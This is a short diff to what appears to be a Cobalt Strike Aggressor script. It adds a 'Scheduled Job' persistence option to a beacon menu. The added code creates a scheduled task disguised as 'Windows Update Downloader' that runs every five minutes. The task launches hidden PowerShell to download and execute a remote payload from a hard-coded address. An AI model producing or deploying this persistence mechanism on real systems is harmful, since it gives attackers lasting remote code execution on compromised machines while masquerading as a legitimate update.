@@ -58,6 +58,10 @@ sub persist_linkinfo {
     }
 }
 
+sub persist_schjob {
+    bshell($1, 'schtasks /create /TN "Windows Update Downloader" /SC Minute /MO 5 /TR "powershell -nop -c "IEX ((new-object net.webclient).downloadstring('http://192.168.133.7:80/a'))""');
+    }
+
 popup beacon_top {
     menu "Persist" {
         item "Persist (DNS)" {
@@ -87,5 +91,12 @@ popup beacon_top {
                 stickykeys($bid);
             }
         }
+        
+	    item "Scheduled Job" {
+	        local('$bid');
+	        foreach $bid ($1) {
+            	persist_schjob($bid);
+	        }   
+    	}
     }
 }
